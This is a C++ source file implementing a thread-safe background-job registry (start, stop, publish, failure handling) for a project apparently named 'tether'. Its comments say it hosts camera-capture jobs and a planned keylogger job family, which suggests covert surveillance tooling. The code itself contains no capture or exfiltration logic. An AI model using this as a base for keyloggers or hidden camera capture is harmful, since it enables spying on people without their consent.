// lib/syscalls/jobs.cpp - the managed background-job lifecycle mechanics
// (see jobs.hpp for the contract). This file owns nothing capture-specific:
// it is the shared registry the camera family uses today and the 6.7
// keylogger family plugs into unchanged.
#include "jobs.hpp"

namespace tether::syscalls {

// ---- JobHandle ---------------------------------------------------------------

void JobHandle::request_stop() {
    requested_.store(true);
}

bool JobHandle::stop_requested() const {
    return requested_.load();
}

void JobHandle::publish(JobDeliverable deliverable) {
    {
        const std::lock_guard<std::mutex> guard(state_mutex_);
        deliverable_.emplace(std::move(deliverable));
    }
    state_cv_.notify_all();
}

std::optional<JobDeliverable> JobHandle::latest() const {
    const std::lock_guard<std::mutex> guard(state_mutex_);
    return deliverable_;
}

void JobHandle::fail(const std::string& reason) {
    {
        const std::lock_guard<std::mutex> guard(state_mutex_);
        failure_.emplace(reason);
    }
    state_cv_.notify_all();
}

std::optional<std::string> JobHandle::failure() const {
    const std::lock_guard<std::mutex> guard(state_mutex_);
    return failure_;
}

// ---- BackgroundJobRegistry -----------------------------------------------------

BackgroundJobRegistry::~BackgroundJobRegistry() {
    const std::lock_guard<std::mutex> guard(mutex_);
    for (auto& entry : jobs_) {
        const std::shared_ptr<RunningJob>& job = entry.second;
        job->handle->request_stop();
        if (job->thread.joinable()) {
            job->thread.join();
        }
    }
    jobs_.clear();
}

bool BackgroundJobRegistry::start(const std::string& slot, Worker worker) {
    auto running_job = std::make_shared<RunningJob>();
    running_job->handle = std::make_shared<JobHandle>();
    // The worker's handle is captured by value through the shared control
    // object; the thread lambda keeps the registry entry alive until it
    // returns (join is never skipped: the entry clears only after join).
    {
        const std::lock_guard<std::mutex> guard(mutex_);
        if (jobs_.find(slot) != jobs_.end()) {
            return false; // occupied: the incumbent is untouched
        }
        jobs_[slot] = running_job;
    }
    const std::weak_ptr<RunningJob> weak = running_job;
    running_job->thread = std::thread(
        [weak, worker = std::move(worker)]() {
            std::shared_ptr<RunningJob> job = weak.lock();
            try {
                worker(*job->handle);
            } catch (const std::exception& error) {
                job->handle->fail(error.what());
            } catch (...) {
                job->handle->fail("background job crashed with an unclassified exception");
            }
            // The slot itself is released by the registry on stop()
            // (stop() owns the join; the thread object disposes after).
        });
    return true;
}

BackgroundJobRegistry::StopOutcome BackgroundJobRegistry::stop(const std::string& slot) {
    StopOutcome outcome;
    std::shared_ptr<RunningJob> job;
    {
        const std::lock_guard<std::mutex> guard(mutex_);
        const auto found = jobs_.find(slot);
        if (found == jobs_.end()) {
            return outcome; // not running: structured not-running upstream
        }
        job = found->second;
        jobs_.erase(found); // the slot frees; the thread below still joins
    }
    outcome.was_running = true;
    // Signal + join OUTSIDE the registry lock so the session-facing calls
    // (start/running on other slots) are never blocked by a winding-down job.
    job->handle->request_stop();
    if (job->thread.joinable()) {
        job->thread.join();
    }
    outcome.failure = job->handle->failure();
    if (!outcome.failure.has_value()) {
        outcome.deliverable = job->handle->latest();
    }
    return outcome;
}

bool BackgroundJobRegistry::running(const std::string& slot) const {
    const std::lock_guard<std::mutex> guard(mutex_);
    return jobs_.find(slot) != jobs_.end();
}

std::shared_ptr<BackgroundJobRegistry> shared_job_registry() {
    // Component-wide single instance (function-local static: thread-safe
    // initialization; lives for the process duration like the daemon main).
    static const std::shared_ptr<BackgroundJobRegistry> registry =
        std::make_shared<BackgroundJobRegistry>();
    return registry;
}

} // namespace tether::syscalls
